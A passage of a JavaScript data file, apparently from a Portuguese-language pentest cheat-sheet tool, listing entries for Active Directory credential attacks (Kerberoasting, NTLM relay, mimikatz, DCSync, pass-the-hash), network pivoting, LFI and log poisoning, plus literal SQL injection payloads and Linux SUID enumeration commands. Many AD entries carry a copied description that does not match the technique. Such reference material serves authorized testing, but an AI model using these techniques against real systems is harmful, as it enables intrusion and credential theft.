      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adBloodhoundPy(domain, user, dc),
      showUrl: false,
      keywords: "ad bloodhound collector python ingest graph paths"
    },
    {
      id: "ad-sharphound",
      title: "AD - SharpHound (Windows)",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adSharpHound(),
      showUrl: false,
      keywords: "ad sharphound bloodhound windows invoke collection"
    },
    {
      id: "ad-kerbrute-users",
      title: "AD - kerbrute userenum",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adKerbruteUsers(domain, dc),
      showUrl: false,
      keywords: "ad kerbrute userenum users brute kerberos valid"
    },
    {
      id: "ad-asrep-roast",
      title: "AD - AS-REP roast GetNPUsers",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adGetNPUsers(domain, dc),
      showUrl: false,
      keywords: "ad asrep roast getnpusers nopreauth hashcat 18200 kerberos"
    },
    {
      id: "ad-spray-kerbrute",
      title: "AD - password spray kerbrute",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adSprayKerbrute(domain, dc),
      showUrl: false,
      keywords: "ad spray password kerbrute lockout kerberos"
    },
    {
      id: "ad-spray-nxc",
      title: "AD - password spray NetExec",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adNxcSpray(dc, domain),
      showUrl: false,
      keywords: "ad spray password netexec nxc smb lockout"
    },
    {
      id: "ad-kerberoast",
      title: "AD - Kerberoast GetUserSPNs",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adGetUserSPNs(domain, user, dc),
      showUrl: false,
      keywords: "ad kerberoast spn getuserspns tgs hashcat 13100 service"
    },
    {
      id: "ad-rubeus-roast",
      title: "AD - Rubeus kerberoast",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adRubeusKerberoast(),
      showUrl: false,
      keywords: "ad rubeus kerberoast windows tgs hashcat"
    },
    {
      id: "ad-rubeus-asrep",
      title: "AD - Rubeus asreproast",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adRubeusAsrep(),
      showUrl: false,
      keywords: "ad rubeus asreproast windows hashcat"
    },
    {
      id: "ad-hashcat-ntlm",
      title: "AD - hashcat NTLM (-m 1000)",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adHashcatNtlm(),
      showUrl: false,
      keywords: "ad hashcat ntlm crack 1000"
    },
    {
      id: "ad-hashcat-netntlmv2",
      title: "AD - hashcat NetNTLMv2 (-m 5600)",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adHashcatNetNTLMv2(),
      showUrl: false,
      keywords: "ad hashcat netntlmv2 responder relay 5600 crack"
    },
    {
      id: "ad-hashcat-tgs",
      title: "AD - hashcat TGS (-m 13100)",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adHashcatTgs(),
      showUrl: false,
      keywords: "ad hashcat kerberoast tgs 13100 crack"
    },
    {
      id: "ad-hashcat-asrep",
      title: "AD - hashcat AS-REP (-m 18200)",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adHashcatAsrep(),
      showUrl: false,
      keywords: "ad hashcat asrep 18200 crack"
    },
    {
      id: "ad-gettgt",
      title: "AD - getTGT (TGT p/ PtT)",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adGetTGT(domain, user, dc),
      showUrl: false,
      keywords: "ad gettgt tgt kerberos passtheticket ccache"
    },
    {
      id: "ad-overpass",
      title: "AD - overpass-the-hash getTGT",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adGetTGTpassHash(domain, user, dc),
      showUrl: false,
      keywords: "ad overpass hash nthash gettgt kerberos passthehash"
    },
    {
      id: "ad-golden",
      title: "AD - golden ticket ticketer",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adTicketerGolden(domain),
      showUrl: false,
      keywords: "ad golden ticket ticketer krbtgt sid forge kerberos persist"
    },
    {
      id: "ad-ntlmrelayx",
      title: "AD - ntlmrelayx",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adNtlmrelayx(),
      showUrl: false,
      keywords: "ad ntlm relay ntlmrelayx smb2support coerce mitm"
    },
    {
      id: "ad-petitpotam",
      title: "AD - PetitPotam coercao",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adPetitPotam(dc, ip),
      showUrl: false,
      keywords: "ad petitpotam coerce efs relay printerbug"
    },
    {
      id: "ad-coercer",
      title: "AD - Coercer scan/coerce",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adCoercer(dc, domain, user),
      showUrl: false,
      keywords: "ad coercer scan coerce relay methods"
    },
    {
      id: "ad-mitm6",
      title: "AD - mitm6 DHCPv6",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adMitm6(domain),
      showUrl: false,
      keywords: "ad mitm6 ipv6 dhcp wpad relay ldaps"
    },
    {
      id: "ad-responder",
      title: "AD - Responder poison",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adResponder(),
      showUrl: false,
      keywords: "ad responder llmnr nbtns mdns poison netntlmv2"
    },
    {
      id: "ad-evilwinrm",
      title: "AD - evil-winrm senha",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adEvilWinrm(dc, user),
      showUrl: false,
      keywords: "ad evil winrm lateral move shell windows"
    },
    {
      id: "ad-evilwinrm-hash",
      title: "AD - evil-winrm pass-the-hash",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adEvilWinrmHash(dc, user),
      showUrl: false,
      keywords: "ad evil winrm passthehash nthash lateral"
    },
    {
      id: "ad-psexec",
      title: "AD - psexec.py",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adPsexec(domain, user, dc),
      showUrl: false,
      keywords: "ad psexec impacket lateral system shell"
    },
    {
      id: "ad-psexec-hash",
      title: "AD - psexec.py pass-the-hash",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adPsexecHash(domain, user, dc),
      showUrl: false,
      keywords: "ad psexec passthehash impacket lateral"
    },
    {
      id: "ad-wmiexec",
      title: "AD - wmiexec.py sem disco",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adWmiexec(domain, user, dc),
      showUrl: false,
      keywords: "ad wmiexec impacket lateral fileless wmi"
    },
    {
      id: "ad-secretsdump",
      title: "AD - secretsdump remoto",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adSecretsdump(domain, user, dc),
      showUrl: false,
      keywords: "ad secretsdump sam lsa ntds dump hashes"
    },
    {
      id: "ad-dcsync",
      title: "AD - DCSync mimikatz",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adDcsyncMimi(domain),
      showUrl: false,
      keywords: "ad dcsync mimikatz krbtgt replication domain admin"
    },
    {
      id: "ad-mimi-lsass",
      title: "AD - mimikatz lsass",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adMimiLsass(),
      showUrl: false,
      keywords: "ad mimikatz lsass sekurlsa logonpasswords creds"
    },
    {
      id: "ad-gpp",
      title: "AD - GPP cpassword SYSVOL",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adGPP(),
      showUrl: false,
      keywords: "ad gpp group.xml cpassword sysvol decrypt"
    },
    {
      id: "ad-certipy",
      title: "AD - Certipy ADCS enum",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adCertipyFind(user, dc),
      showUrl: false,
      keywords: "ad certipy adcs esc certificate pki template"
    },
    {
      id: "piv-ssh-l",
      title: "Pivot - SSH local forward -L",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivSshL(ip, pivhost),
      showUrl: false,
      keywords: "pivot ssh forward local tunnel internal port"
    },
    {
      id: "piv-ssh-r",
      title: "Pivot - SSH remote forward -R",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivSshR(ip),
      showUrl: false,
      keywords: "pivot ssh reverse remote forward tunnel expose"
    },
    {
      id: "piv-ssh-d",
      title: "Pivot - SSH SOCKS dinamico -D",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivSshD(ip),
      showUrl: false,
      keywords: "pivot ssh socks dynamic proxy proxychains tunnel"
    },
    {
      id: "piv-ssh-j",
      title: "Pivot - SSH Jump -J",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivSshJ(ip, pivhost),
      showUrl: false,
      keywords: "pivot ssh jump bastion tunnel"
    },
    {
      id: "piv-sshuttle",
      title: "Pivot - sshuttle VPN over SSH",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivSshuttle(ip, pivnet),
      showUrl: false,
      keywords: "pivot sshuttle vpn subnet route tunnel"
    },
    {
      id: "piv-chisel-server",
      title: "Pivot - Chisel server --reverse",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivChiselServer(port),
      showUrl: false,
      keywords: "pivot chisel server reverse listener tunnel"
    },
    {
      id: "piv-chisel-socks",
      title: "Pivot - Chisel client R:socks",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivChiselSocks(ip, port),
      showUrl: false,
      keywords: "pivot chisel client socks reverse proxy tunnel"
    },
    {
      id: "piv-chisel-remote",
      title: "Pivot - Chisel remote forward",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivChiselRemote(ip, port, pivhost),
      showUrl: false,
      keywords: "pivot chisel remote forward port tunnel"
    },
    {
      id: "piv-chisel-local",
      title: "Pivot - Chisel local forward",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivChiselLocal(ip, port, pivhost),
      showUrl: false,
      keywords: "pivot chisel local forward tunnel"
    },
    {
      id: "piv-ligolo-proxy",
      title: "Pivot - Ligolo proxy + tun",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivLigoloProxy(),
      showUrl: false,
      keywords: "pivot ligolo proxy tun interface tunnel"
    },
    {
      id: "piv-ligolo-agent",
      title: "Pivot - Ligolo agent -connect",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivLigoloAgent(ip, port),
      showUrl: false,
      keywords: "pivot ligolo agent connect tunnel"
    },
    {
      id: "piv-ligolo-route",
      title: "Pivot - Ligolo rota p/ rede",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivLigoloRoute(pivnet),
      showUrl: false,
      keywords: "pivot ligolo route subnet session start"
    },
    {
      id: "piv-socat-relay",
      title: "Pivot - Socat relay TCP",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivSocatRelay(port, pivhost),
      showUrl: false,
      keywords: "pivot socat relay fork forward tcp tunnel"
    },
    {
      id: "piv-proxychains",
      title: "Pivot - Proxychains via SOCKS",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivProxychains(),
      showUrl: false,
      keywords: "pivot proxychains socks nxc scan tunnel"
    },
    {
      id: "piv-plink",
      title: "Pivot - Plink -L (pivot Win)",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivPlinkL(ip, pivhost),
      showUrl: false,
      keywords: "pivot plink putty windows ssh forward tunnel"
    },
    {
      id: "piv-netsh",
      title: "Pivot - netsh portproxy (Win)",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivNetshProxy(port, pivhost),
      showUrl: false,
      keywords: "pivot netsh portproxy windows forward tunnel"
    },
    {
      id: "piv-msf-autoroute",
      title: "Pivot - Meterpreter autoroute",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivMsfAutoroute(pivnet),
      showUrl: false,
      keywords: "pivot meterpreter autoroute route metasploit session"
    },
    {
      id: "piv-msf-portfwd",
      title: "Pivot - Meterpreter portfwd",
      category: "pivot",
      categoryLabel: "Pivot",
      icon: "\udb81\udc69",
      subcat: "pivot",
      context: "Pivoting & Network Tunneling",
      purpose: "Criar rota para redes e subredes internas",
      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
      code: pivMsfPortfwd(port, pivhost),
      showUrl: false,
      keywords: "pivot meterpreter portfwd forward metasploit session"
    },
    {
      id: "lfi-traversal",
      title: "LFI - Traversal (/etc/passwd)",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiTraversal(),
      showUrl: true,
      keywords: "lfi traversal path etc passwd directory local file inclusion"
    },
    {
      id: "lfi-wrapper",
      title: "LFI - PHP Filter Wrapper Base64",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiWrapper(),
      showUrl: true,
      keywords: "lfi php filter wrapper convert base64 resource"
    },
    {
      id: "lfi-logs",
      title: "LFI - Apache Log Poisoning",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiLogs(),
      showUrl: true,
      keywords: "lfi log poison apache access cmd rce"
    },
    {
      id: "sqli-union-1",
      title: "SQLi - UNION SELECT NULL",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "' UNION SELECT NULL,NULL,NULL -- -",
      showUrl: true,
      keywords: "sqli sql injection union select null bypass"
    },
    {
      id: "sqli-union-dual",
      title: "SQLi - UNION SELECT DUAL",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "' UNION SELECT NULL,NULL,NULL FROM DUAL -- -",
      showUrl: true,
      keywords: "sqli sql injection union select dual oracle"
    },
    {
      id: "sqli-order-by",
      title: "SQLi - ORDER BY column count",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "' UNION ORDER BY 1 -- -",
      showUrl: true,
      keywords: "sqli sql injection order by column count enum"
    },
    {
      id: "sqli-auth-bypass",
      title: "SQLi - Auth Bypass OR 1=1",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "auth",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "' OR '1'='1' -- -",
      showUrl: true,
      keywords: "sqli sql injection auth bypass login 1=1"
    },
    {
      id: "sqli-admin-comment",
      title: "SQLi - Admin Comment",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "admin' --",
      showUrl: true,
      keywords: "sqli sql injection admin comment login bypass"
    },
    {
      id: "linux-suid-4000",
      title: "Linux - SUID Binaries (/4000)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "suid",
      context: "Privilege Escalation",
      purpose: "Localizar bin\u00e1rios com bit SUID configurado",
      description: "Lista execut\u00e1veis pertencentes ao root que rodam com privil\u00e9gios elevados. \u00datil para verificar GTFOBins.",
      code: "find / -user root -perm /4000 -type f 2>/dev/null",
      showUrl: false,
      keywords: "linux suid perm 4000 root privesc gtfobins"
    },
    {
      id: "linux-suid-u-s",
      title: "Linux - SUID Binaries (-u=s)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "suid",
      context: "Privilege Escalation",
      purpose: "Localizar arquivos com SUID usando sintaxe u=s",
      description: "Busca alternativa para arquivos SUID em todo o sistema de arquivos descartando erros de permiss\u00e3o.",
      code: "find / -perm -u=s -type f 2>/dev/null",
      showUrl: false,
      keywords: "linux suid u=s privesc files"
    },
    {
      id: "linux-sgid-2000",
      title: "Linux - SGID Binaries (/2000)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "sgid",
      context: "Privilege Escalation",
      purpose: "Localizar bin\u00e1rios com bit SGID (execu\u00e7\u00e3o como grupo propriet\u00e1rio)",
      description: "Procura bin\u00e1rios que executam com privil\u00e9gios de grupo (ex: grupo shadow, disk, etc.).",
      code: "find / -perm -g=s -type f 2>/dev/null",
      showUrl: false,
      keywords: "linux sgid perm 2000 group privesc"
    },
    {
      id: "linux-cap-getcap",
      title: "Linux - Capabilities (getcap)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "capabilities",
      context: "Privilege Escalation / Capabilities",
      purpose: "Inspecionar capacidades POSIX em execut\u00e1veis",
      description: "Busca bin\u00e1rios com capacidades como cap_setuid, cap_net_raw ou cap_dac_override para escalonamento.",
      code: "getcap -r / 2>/dev/null",
      showUrl: false,
      keywords: "linux capabilities getcap cap_setuid privesc"
    },
    {
      id: "linux-cron-crontab",
      title: "Linux - Crontab do Usu\u00e1rio e Sistema",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "cron",
      context: "Cron & Scheduled Tasks",
      purpose: "Ver tarefas agendadas em execu\u00e7\u00e3o peri\u00f3dica",
      description: "Examina agendamentos de tarefas locais, scripts em /etc/cron* e tarefas do sistema para identificar scripts vulner\u00e1veis.",
      code: "crontab -l; cat /etc/crontab /etc/cron.*/* 2>/dev/null",
      showUrl: false,
      keywords: "linux cron crontab scheduled tasks privesc"
    },
    {
      id: "linux-cron-systemd-timers",
      title: "Linux - Systemd Timers",
